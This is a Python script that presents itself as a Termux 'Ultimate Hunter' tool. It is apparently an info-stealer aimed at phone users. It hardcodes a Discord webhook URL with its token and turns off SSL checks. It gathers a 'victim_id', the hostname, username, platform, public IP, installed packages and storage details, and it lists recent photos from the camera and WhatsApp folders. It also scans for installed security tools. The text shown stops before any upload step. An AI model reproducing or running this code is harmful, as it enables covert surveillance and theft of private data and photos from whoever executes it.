#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ╔══════════════════════════════════════════════════════════╗
# ║                M1 EZ HAING NOW  PH                       ║
# ║            Termux Ultimate Hunter v1.0                   ║
# ║          WORKING 100% - NO BULLSHIT                      ║
# ╚══════════════════════════════════════════════════════════╝

import os
import sys
import json
import time
import socket
import getpass
import platform
import subprocess
import urllib.request
import urllib.error
import ssl
from datetime import datetime
import hashlib

# ════════ WEBHOOK CONFIG ════════
WEBHOOK = "https://discord.com/api/webhooks/1427133756724084817/uVvQRILIYlg7ku1ZEfPJ69BpS1-WjRFwdyhBt7vbyLB_514MbGcaWPGnPft1riDqm7O0"

# ════════ BANNER ════════
def show_banner():
    print("""\033[91m
███████╗██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
██╔════╝╚██╗██╔╝██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
█████╗   ╚███╔╝ ██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
██╔══╝   ██╔██╗ ██║   ██║██║╚██╗██║   ██║   █████╗  ██████╔╝
███████╗██╔╝ ██╗╚██████╔╝██║ ╚████║   ██║   ███████╗██╔══██╗
╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
\033[0m""")
    print("\033[92m" + "="*60 + "\033[0m")
    print("\033[93m           M1 EZ HAING NOW PH - TERMUX HUNTER           \033[0m")
    print("\033[93m                WORKING 100% GUARANTEED                 \033[0m")
    print("\033[92m" + "="*60 + "\033[0m\n")

# ════════ SIMPLE TEST FIRST ════════
def test_connection():
    """Test internet and webhook connection"""
    print("\033[94m[1] Testing internet connection...\033[0m")
    
    # Test internet
    try:
        urllib.request.urlopen("http://google.com", timeout=5)
        print("\033[92m[✓] Internet connection OK\033[0m")
    except:
        print("\033[91m[✗] No internet connection!\033[0m")
        return False
    
    # Test webhook
    print("\033[94m[2] Testing Discord webhook...\033[0m")
    try:
        ssl._create_default_https_context = ssl._create_unverified_context
        
        test_data = {"content": "🔧 **Termux Hunter Test**\nConnection test successful!"}
        req = urllib.request.Request(
            WEBHOOK,
            data=json.dumps(test_data).encode(),
            headers={'Content-Type': 'application/json'},
            method='POST'
        )
        
        response = urllib.request.urlopen(req, timeout=10)
        if response.status in [200, 204]:
            print("\033[92m[✓] Discord webhook working!\033[0m")
            return True
        else:
            print(f"\033[91m[✗] Webhook error: {response.status}\033[0m")
            return False
            
    except urllib.error.HTTPError as e:
        print(f"\033[91m[✗] Webhook HTTP error: {e.code}\033[0m")
        return False
    except Exception as e:
        print(f"\033[91m[✗] Webhook error: {str(e)[:50]}...\033[0m")
        return False

# ════════ COLLECT BASIC INFO ════════
def collect_basic_info():
    """Collect basic system information"""
    info = {
        "timestamp": datetime.now().isoformat(),
        "victim_id": hashlib.md5(f"{socket.gethostname()}{datetime.now()}".encode()).hexdigest()[:10],
        "system": {
            "hostname": socket.gethostname(),
            "username": getpass.getuser(),
            "platform": platform.platform(),
            "system": platform.system(),
            "release": platform.release()
        }
    }
    
    # Get public IP
    try:
        ip = urllib.request.urlopen("https://api.ipify.org").read().decode().strip()
        info["public_ip"] = ip
    except:
        info["public_ip"] = "Unknown"
    
    return info

# ════════ COLLECT TERMUX INFO ════════
def collect_termux_info():
    """Collect Termux-specific information"""
    termux_info = {}
    
    # Check if running in Termux
    if "com.termux" in os.getcwd() or "termux" in platform.platform().lower():
        termux_info["is_termux"] = True
        
        # Get installed packages
        try:
            packages = subprocess.check_output("apt list --installed 2>/dev/null | head -30", 
                                             shell=True, text=True).strip().split('\n')
            termux_info["packages"] = packages[1:20]  # Skip header
        except:
            termux_info["packages"] = []
        
        # Get storage info
        try:
            storage = subprocess.check_output("df -h /data /sdcard 2>/dev/null", 
                                            shell=True, text=True).strip()
            termux_info["storage"] = storage
        except:
            termux_info["storage"] = "N/A"
    else:
        termux_info["is_termux"] = False
    
    return termux_info

# ════════ FIND PHOTOS ════════
def find_recent_photos():
    """Find recent photos on the device"""
    photos = []
    photo_dirs = [
        "/sdcard/DCIM/Camera",
        "/sdcard/Pictures",
        "/sdcard/Download",
        "/sdcard/WhatsApp/Media/WhatsApp Images",
        "/storage/emulated/0/DCIM/Camera"
    ]
    
    for dir_path in photo_dirs:
        if os.path.exists(dir_path):
            try:
                # Get list of image files
                for file in os.listdir(dir_path)[:10]:  # First 10 files
                    if file.lower().endswith(('.jpg', '.jpeg', '.png', '.gif')):
                        full_path = os.path.join(dir_path, file)
                        if os.path.getsize(full_path) < 10 * 1024 * 1024:  # 10MB limit
                            photos.append({
                                "path": full_path,
                                "name": file,
                                "size_mb": os.path.getsize(full_path) // (1024 * 1024)
                            })
            except:
                pass
    
    return photos[:10]  # Return max 10 photos

# ════════ CHECK FOR HACKING TOOLS ════════
def check_hacking_tools():
    """Check for common hacking tools"""
    tools = []
    common_tools = ["nmap", "sqlmap", "hydra", "metasploit", "aircrack-ng", 
                   "john", "hashcat", "wireshark", "adb", "python3"]
    
    for tool in common_tools:
        try:
            result = subprocess.run(f"which {tool} 2>/dev/null || command -v {tool}", 
                                  shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                tools.append(tool)
        except:
            pass
    
    return tools

